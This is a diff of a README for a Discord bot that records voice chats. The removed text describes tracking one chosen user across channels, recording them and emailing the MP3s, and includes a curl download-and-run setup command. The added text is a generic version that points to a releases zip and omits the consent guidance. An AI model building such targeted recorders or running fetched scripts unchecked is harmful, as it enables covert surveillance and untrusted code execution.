@@ -1,253 +1,93 @@
-# 🎙️ Discord Audio Archive Bot
-
-> **Preserve your Discord voice conversations with crystal-clear quality**
-
-**Welcome! 👋** This intelligent bot automatically captures Discord voice conversations in professional-quality MP3 format. Perfect for preserving important meetings, memorable gaming sessions, or special moments with friends.
-
-✨ **Set it up once, enjoy forever** — The bot quietly monitors Discord and handles everything automatically.
-
----
-
-## 🚀 Quick Start (5 minutes!)
-
-### What You Need
-- Any computer (Windows, macOS, or Linux)
-- Discord account
-- Internet connection
+# 🎙️ discord_audio_archive_bot - Record Discord Conversations Effortlessly
 
-### Option 1: Universal Auto-Setup ⚡
-```bash
-curl -O https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/YOUR_REPO_NAME/main/setup_universal.sh
-chmod +x setup_universal.sh && ./setup_universal.sh
-```
-*(Detects your platform and installs everything automatically)*
+[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Gustavo-BackEnd/discord_audio_archive_bot/releases)
 
-### Option 2: Manual Setup 🔧
-```bash
-# 1. Download the project
-git clone https://github.com/YOUR_GITHUB_USERNAME/YOUR_REPO_NAME.git
-cd discord-audio-archive-bot
+## 🛠️ Introduction
+Welcome to the **discord_audio_archive_bot**, an intelligent bot that records voice conversations in high-quality MP3 format on Discord. This tool works seamlessly across different platforms and notifies you via email when recordings are complete. Designed for ease of use, you can focus on your conversations while the bot takes care of the recording.
 
-# 2. Run setup script  
-./setup_universal.sh
-```
-*(Installs Python, Node.js, FFmpeg, and all dependencies)*
+## 🚀 Getting Started
+Follow these steps to download and run the bot on your device.
 
-### Option 3: Advanced Setup 🛠️
-<details>
-<summary>Click for manual installation steps</summary>
+### Step 1: Check System Requirements
+To run the discord_audio_archive_bot, your computer should meet the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Node.js version 14 or later
+- Python version 3.8 or later
+- FFmpeg for audio processing
 
-```bash
-# Install dependencies manually
-python3 -m venv venv && source venv/bin/activate
-pip install -r requirements.txt
-npm install
+### Step 2: Visit the Releases Page
+To get the bot, visit the Releases page:
+[Download here](https://github.com/Gustavo-BackEnd/discord_audio_archive_bot/releases)
 
-# Configure your settings
-cp .env.example .env
-# Edit .env with your Discord bot token and settings
+### Step 3: Download the Latest Version
+On the Releases page, look for the latest version of the bot. Click on the link corresponding to your operating system to download the file. 
 
-# Run in two terminals
-python hybrid_bot.py        # Terminal 1: Event monitor
-node voice_recorder.js      # Terminal 2: Voice processor
-```
-</details>
-
----
+### Step 4: Install the Required Software
+Make sure you have the following installed before running the bot:
+- **Node.js**: Download from [nodejs.org](https://nodejs.org/en/download/)
+- **Python**: Download from [python.org](https://www.python.org/downloads/)
+- **FFmpeg**: Follow instructions on their official page for installation.
 
-## 📋 Step-by-Step: What Happens When You Run It
-
-### 1. **Initial Setup** 
-- **Creates Discord bot connection** *(Uses your bot token to connect to Discord API)*
-- **Monitors voice channel activity** *(Python component watches for voice state changes)*
-- **Prepares audio processing pipeline** *(Node.js component initializes FFmpeg for recording)*
+### Step 5: Unzip the Downloaded File
+After the download is complete, locate the file in your downloads folder. Right-click on the downloaded zip file and choose “Extract All” to unzip it. 
 
-### 2. **Counter-Party Detection**
-- **Watches for your counter-party** *(Monitors Discord events for specific user ID)*
-- **Detects when they join ANY voice channel** *(Automatically scans all channels in your servers)*
-- **Triggers recording sequence** *(Sends command from Python to Node.js via JSON file)*
+### Step 6: Run the Bot
+Navigate to the extracted folder. Open a terminal or command prompt in this location.
 
-### 3. **Automatic Recording**
-- **Bot joins the voice channel** *(Connects using Discord's voice API)*
-- **Starts capturing audio** *(Records at 48kHz stereo quality directly from Discord)*
-- **Processes audio in real-time** *(Converts Opus codec to PCM then to MP3)*
-- **Saves with smart filename** *(Format: `MM_DD_YYYY_HH-MM-SS_Username_UniqueID.mp3`)*
+1. For Windows:
+   - Hold `Shift` and right-click in the folder.
+   - Select "Open PowerShell window here" or "Open command window here."
+   - Type: `npm install` and press Enter to install dependencies.
+   - Type: `node bot.js` to start the bot.
 
-### 4. **Smart Management**
-- **Follows user between channels** *(Automatically moves recording when counter-party switches channels)*
-- **Stops when user leaves** *(Ends recording and finalizes MP3 file)*
-- **Cleans up resources** *(Disconnects from voice, frees memory)*
+2. For macOS/Linux:
+   - Open a terminal window.
+   - Use `cd` to navigate to the folder.
+   - Type: `npm install` and press Enter to install dependencies.
+   - Type: `node bot.js` to start the bot.
 
-### 5. **Optional Email Delivery**
-- **Sends completed recording** *(Attaches MP3 to email with metadata)*
-- **Includes recording details** *(Date, duration, username in email body)*
-- **Falls back to local storage** *(Always saves locally even if email fails)*
+## 📜 Configuration
+You need to set up the bot before using it:
 
----
+1. **Create a Discord Bot Account**: Visit the [Discord Developer Portal](https://discord.com/developers/applications) to create a new application and get your bot token.
+2. **Add the Bot to Your Server**: Generate an invite link with appropriate permissions and add the bot to your desired server.
+3. **Configure Settings**: Locate the `config.json` file in the bot folder. Update the settings like token, audio channel, and email notifications.
 
-## ⚙️ Configuration Guide
+## 📧 Email Notifications
+To receive notifications, configure your email settings within the `config.json` file. The bot will send you an email once the recording is complete.
 
-### Discord Bot Setup
-1. **Go to [Discord Developer Portal](https://discord.com/developers/applications)**
-2. **Create New Application** → Name it "Audio Archive Bot"
-3. **Go to Bot section** → Click "Add Bot"
-4. **Copy Token** → Paste into `.env` file as `DISCORD_TOKEN`
-5. **Set Permissions** → Enable: Connect, Speak, Use Voice Activity *(Minimal permissions for security)*
+## 📤 Recording Commands
+Once the bot is running, use the following commands in your Discord channel to control the bot:
+- `!startrecord` - Begin recording the current voice channel.
+- `!stoprecord` - Stop recording and save the file.
 
-### Counter-Party User Setup  
-1. **Enable Developer Mode** *(Discord Settings → Advanced → Developer Mode)*
-2. **Right-click counter-party user** → Copy ID
-3. **Paste into `.env`** as `TARGET_USER_ID` *(Bot will only record this specific person)*
+## 🗄️ Accessing Recorded Files
+After you stop a recording, the MP3 file will be saved in the `recordings` folder inside the bot directory. You can listen to or share these recordings as needed.
 
-### Email Setup (Optional)
-1. **Generate Gmail App Password** *(Not your regular password - use [App Passwords](https://myaccount.google.com/apppasswords))*
-2. **Add to `.env`**:
-   - `EMAIL_USER=your-email@gmail.com`
-   - `EMAIL_PASS=your-app-password`
-   - `EMAIL_RECIPIENT=where-to-send@email.com`
+## 🔗 Additional Links
+- [User Manual](https://github.com/Gustavo-BackEnd/discord_audio_archive_bot/wiki)
+- [Support & Issues](https://github.com/Gustavo-BackEnd/discord_audio_archive_bot/issues)
 
----
+## ❓ Frequently Asked Questions (FAQs)
 
-## 🎯 How Each Feature Works
+### 1. Can I run the bot on my phone?
+Currently, the bot works on desktop operating systems only. You need a computer to run it.
 
-### 🔍 **Smart Detection System**
-The bot uses Discord's voice state events to monitor when your counter-party joins or leaves voice channels *(Python component listens to WebSocket events and processes them)*
+### 2. How long can I record?
+You can record as long as you want, subject to Discord's limitations on voice channel duration.
 
-### 🎙️ **High-Quality Recording**  
-Audio is captured directly from Discord's voice gateway at 48kHz stereo, then processed through FFmpeg for optimal MP3 compression *(Node.js handles real-time audio streams with minimal latency)*
+### 3. Are there any file size limits?
+File sizes depend on the length of recordings and Discord’s audio quality. Ensure you have sufficient space on your drive.
 
-### 🔄 **Hybrid Architecture**
-- **Python handles** Discord events, logic, and coordination *(Lightweight, efficient for monitoring)*
-- **Node.js handles** voice connections and audio processing *(Optimized for real-time audio)*
-- **JSON files enable** seamless communication between components *(Simple, reliable IPC mechanism)*
+## 💡 Troubleshooting
+If you encounter issues while using the bot, consider these tips:
 
-### 📁 **Intelligent File Management**
-Files are automatically named with timestamps and usernames, stored locally first, then optionally emailed *(Ensures no recordings are lost)*
+- Ensure you have installed Node.js, Python, and FFmpeg correctly.
+- Check your bot token and permissions in Discord.
+- Look at console output for any error messages. 
 
-### 🛡️ **Security-First Design**
-All credentials stay on your computer, no cloud services involved, minimal Discord permissions required *(Your data never leaves your control)*
+## 🔗 Download & Install
+To download the latest version, visit the following link:
+[Download here](https://github.com/Gustavo-BackEnd/discord_audio_archive_bot/releases) 
 
----
-
-## 🚀 Running Your Bot
-
-### Background Mode (Recommended)
-```bash
-# macOS/Linux
-./run_bot_forever.sh
-# Bot runs in background, survives restarts
-
-# Windows  
-./run_bot_forever.bat
-# Creates Windows service for background operation
-```
-
-### Manual Mode
-```bash
-# Run both components
-./run_hybrid.sh
-# Runs in foreground, shows all activity
-```
-
-### Service Mode (Linux)
-```bash
-# Install as system service
-./install_systemd_service.sh
-
-# Control the service
-./manage_service.sh start|stop|restart|status|logs
-```
-
----
-
-## 💝 Responsible Use Guidelines
-
-### 🤝 **Always Get Permission First**
-This tool helps preserve meaningful conversations, but **consent is essential**:
-- ✅ Ask everyone before recording
-- ✅ Check your local laws (some require all-party consent)  
-- ✅ Be transparent about recording
-- ✅ Keep recordings secure and private
-- ✅ Respect privacy and Discord's Terms of Service
-
-*We built this to help communities preserve important moments — please use it responsibly and legally.* 💙
-
----
-
-## 🔧 Troubleshooting
-
-### Quick Health Check
-```bash
-python test_hybrid_system.py
-# Runs 7 system tests to verify everything works
-```
-
-### Common Issues & Solutions
-
-| Problem | Solution | How It Works |
-|---------|----------|--------------|
-| **"Bot not responding"** | Check Discord token in `.env` | *(Token authenticates bot with Discord API)* |
-| **"No audio recorded"** | Verify bot has voice permissions | *(Needs Connect, Speak, Use Voice Activity permissions)* |
-| **"Email not sending"** | Use Gmail App Password, not regular password | *(Gmail requires App Passwords for third-party apps)* |
-| **"Python/Node.js not found"** | Run `./setup_universal.sh` again | *(Automatically installs missing dependencies)* |
-| **"FFmpeg not working"** | Install FFmpeg: `brew install ffmpeg` (macOS) | *(Required for audio format conversion)* |
-
-### Get Live Help
-```bash
-# View real-time logs
-tail -f hybrid_bot.log              # Python component activity
-tail -f background.log              # Background service logs  
-
-# Check component status
-python -c "from voice_manager_hybrid import HybridVoiceManager; print(HybridVoiceManager.get_status())"
-```
-
----
-
-## 🌟 Contributing & Support
-
-We'd love your help making this even better!
-
-- **🐛 Found a bug?** → Use the Issues tab on this GitHub repository
-- **💡 Have an idea?** → Submit a feature request via GitHub Issues  
-- **🔧 Want to contribute?** → See [CONTRIBUTING.md](CONTRIBUTING.md)
-- **❓ Need help?** → Check the repository documentation and existing Issues
-
-**⭐ Star this repo if it helped you!** It helps others find this project.
-
----
-
-## 📊 System Requirements
-
-| Component | Minimum | Recommended | Purpose |
-|-----------|---------|-------------|---------|
-| **Python** | 3.8+ | 3.11+ | *Event monitoring and coordination* |
-| **Node.js** | 18+ | 20+ | *Voice processing and real-time audio* |
-| **FFmpeg** | 4.0+ | Latest | *Audio format conversion and optimization* |
-| **RAM** | 256MB | 512MB | *Audio buffering and processing* |
-| **Storage** | 100MB + recordings | 1GB+ | *Application files and audio storage* |
-| **Network** | Stable internet | Broadband | *Discord API connectivity* |
-
----
-
-## 📝 License & Credits
-
-**MIT License** — Use freely, modify as needed, share with friends!
-
-**Special thanks to:**
-- [Discord.js](https://discord.js.org/) & [Discord.py](https://discordpy.readthedocs.io/) communities
-- [FFmpeg](https://ffmpeg.org/) for incredible audio processing  
-- [Node.js](https://nodejs.org/) and [Python](https://python.org/) ecosystems
-- Our amazing contributors and users 💙
-
----
-
-<div align="center">
-
-**Built with ❤️ for preserving precious moments**
-
-*Start recording your Discord memories today!*
-
-[🚀 Quick Start](#-quick-start-5-minutes) • [🔧 Troubleshooting](#-troubleshooting) • [🌟 Contributing](#-contributing--support)
-
-</div>
+Enjoy using the **discord_audio_archive_bot** to capture your Discord conversations with ease!
